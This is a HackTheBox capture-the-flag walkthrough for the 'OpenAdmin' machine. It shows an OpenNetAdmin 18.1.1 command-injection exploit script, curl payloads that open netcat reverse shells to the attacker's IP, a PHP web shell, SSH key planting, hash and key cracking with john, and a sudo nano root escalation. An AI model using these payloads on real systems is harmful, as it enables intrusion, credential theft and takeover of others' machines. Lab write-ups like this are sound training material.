---
icon: ubuntu
---

# OpenAdmin - Easy

<figure><img src="../../.gitbook/assets/image (32).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/openadmin"><strong>OpenAdmin</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.10.10 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 04:22 -0500
Nmap scan report for 10.129.10.10
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   21.31 ms 10.10.16.1
2   43.04 ms 10.129.10.10
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
feroxbuster -u http://10.129.9.162/ -n
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Found 3 interesting endpoints

#### <mark style="color:$primary;">/music</mark>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Clicking on the login link redirects us to [http://10.129.10.10/ona/](http://10.129.10.10/ona/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is an instance of OpenNetAdmin and it is screaming at us that the current version is out of date

### <mark style="color:blue;">OpenNetAdmin v18.1.1 RCE</mark>

A quick search on exploit reveals RCE

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

I am going to download the bash script

{% code overflow="wrap" %}
```shellscript
searchsploit -m 47691
```
{% endcode %}

{% code title="47691.sh" overflow="wrap" %}
```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
{% endcode %}

The script simply runs a curl command with our given parameter and than it gets cleaned up using command line fu

If we simply run the curl command replacing `${cmd} & ${URL}` will get the raw output

{% code overflow="wrap" %}
```shellscript
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" "http://10.129.10.10/ona/"
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
<!-- Module Output -->
<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
    <tr>
        <td align="left" class="padding">
            <br>
            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
                <pre style="padding: 4px;font-family: monospace;">BEGIN
uid=33(www-data) gid=33(www-data) groups=33(www-data)
END
</pre>
            </div>
        </td>
    </tr>
</table>
...[snip]...
```
{% endcode %}

I'll use the curl command ot get a reverse shell. nc is on the machine so I'll make use of it

{% code overflow="wrap" %}
```shellscript
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";busybox nc 10.10.16.96 443 -e /bin/sh;echo \"END\"&xajaxargs[]=ping" "http://10.129.10.10/ona/"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shel as www-data</mark>

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

there are 2 more users on this box besides root. I'll keep that in mind during manual enumeration

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

I came across some credentials in `/opt/ona/www/local/config`&#x20;

Let's test if these credentials work for another use

#### <mark style="color:$primary;">Credential Reuse</mark>

{% code overflow="wrap" %}
```shellscript
jimmy:n1nj4W4rri0R!
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Shell as jimmy</mark>

I'll setup ssh access for a better shell

{% code title="Commands
# on the target machine" overflow="wrap" %}
```shellscript
mkdir .ssh
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
# copy the id_rsa key
cat id_rsa

# on your machine save the key to a file then setup permissions and ssh
chmod 600 jimmy_id_rsa
ssh -i jimmy_id_rsa jimmy@10.129.10.10
```
{% endcode %}

#### <mark style="color:$primary;">Manual Enumeration</mark>

I am gonna check out files owned by jimmy

{% code overflow="wrap" %}
```shellscript
find / -user jimmy 2>/dev/null
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

It looks like some of the internal website files are owned by him. Let's check out internals!

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Besides those files nothing much here. I'll look at the `/etc/apache2/sites-enabled` config files to see how its hosted (different vhost, or path, or port)

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

we already know openadmin is listening on port 80 it was our way in

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

but internal is hosted on localhost port 52846, and is being run as joanna!

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Setup tunnel via SSH</mark>

I'll setup a tunnel via SSH so that I can reach the internal site

{% code overflow="wrap" %}
```shellscript
ssh -i jimmy_id_rsa jimmy@10.129.10.10 -L 52846:localhost:52846
```
{% endcode %}

Now I can visit `http://localhost:52846` and see what is there

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

There are 2 ways to escalate privileges from here.

### <mark style="color:blue;">Path 1: PHP Web Shell</mark>

We know from manual enumeration that jimmy has write access on&#x20;

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

I am going to write a webshell into the root directory

{% code overflow="wrap" %}
```shellscript
echo '<?php system($_REQUEST['cmd']); ?>' > rev.php
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Now I can access that from my machine and get execution as joanna:

{% code overflow="wrap" %}
```shellscript
curl http://localhost:52846/rev.php?cmd=id
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

To get a shell i'll use nc, have a listener ready on your machine

{% code overflow="wrap" %}
```shellscript
curl http://localhost:52846/rev.php?cmd=busybox%20nc%2010.10.16.96%20443%20-e%20/bin/sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Path 2: Hardcoded Credentials</mark>

in `/var/www/internal/index.php` there are hardcoded credentials for the login

{% code overflow="wrap" %}
```php
<?php
  $msg = '';

  if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
        $_SESSION['username'] = 'jimmy';
        header("Location: /main.php");
    } else {
        $msg = 'Wrong username or password.';
    }
  }
?>
```
{% endcode %}

Crackstation cracks the hash for us

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

now we can login with <mark style="color:$success;">**jimmy:Revealed**</mark>&#x20;

Upon login we are redirected to `main.php` where there is an encrypted ssh key

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Decrypting SSH Key</mark>

* First Save the key to a file, then run the following commands

{% code overflow="wrap" %}
```shellscript
ssh2john joanna_id_rsa > joanna_id_rsa.hash
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
john --wordlist=/usr/share/wordlists/rockyou.txt joanna_id_rsa.hash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

We got a successful crack. Now we can ssh as joanna

{% code overflow="wrap" %}
```shellscript
chmod 600 joanna_id_rsa
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
ssh -i joanna_id_rsa joanna@10.129.10.10
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Shell as joanna</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Joanna can run `nano` on `/opt/priv` as the root user

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

GTFObins has an easy privesc for this

### <mark style="color:blue;">SUDO nano -> GTFObins privesc</mark>

{% embed url="https://gtfobins.org/gtfobins/nano/#shell" %}

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

run&#x20;

{% code overflow="wrap" %}
```shellscript
sudo /bin/nano /opt/priv
```
{% endcode %}

Then press Ctrl+r (To read a file) then Ctrl+x (To execute a command)

Now type

{% code overflow="wrap" %}
```shellscript
reset; sh 1>&0 2>&0
```
{% endcode %}

and press enter you will see a `#` spawn, you can type commands there

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

hit enter a few times and type bash

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
